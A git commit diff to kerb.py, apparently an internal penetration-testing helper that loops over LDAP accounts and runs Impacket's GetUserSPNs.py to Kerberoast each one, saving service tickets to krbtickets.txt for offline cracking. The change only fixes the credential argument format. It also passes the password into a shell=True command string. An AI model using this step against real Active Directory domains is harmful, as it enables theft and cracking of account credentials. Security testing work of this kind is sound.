d234f1f33bfd0ad597fa43260a2f46144ca69092
AJ Hammond <aj.hammond@praetorian.com>
2024-03-15 23:48:22 -0400

    i am braindead

--- kerb.py
+++ kerb.py
@@ -17,7 +17,7 @@ def find_and_kerberoast_objects(username, password, domain, dc_ip):
         for entry in conn.entries:
             sAMAccountName = entry['sAMAccountName'].value
             print(f"Kerberoasting {sAMAccountName}...")
-            cmd = f"GetUserSPNs.py -request -dc-ip {dc_ip} -outputfile krbtickets.txt -u {username}@{domain}:{password} {sAMAccountName}"
+            cmd = f"GetUserSPNs.py -request -dc-ip {dc_ip} -outputfile krbtickets.txt -u {domain}/{username}@{dc_ip}:{password} {sAMAccountName}"
             subprocess.run(cmd, shell=True)
 
         conn.unbind()
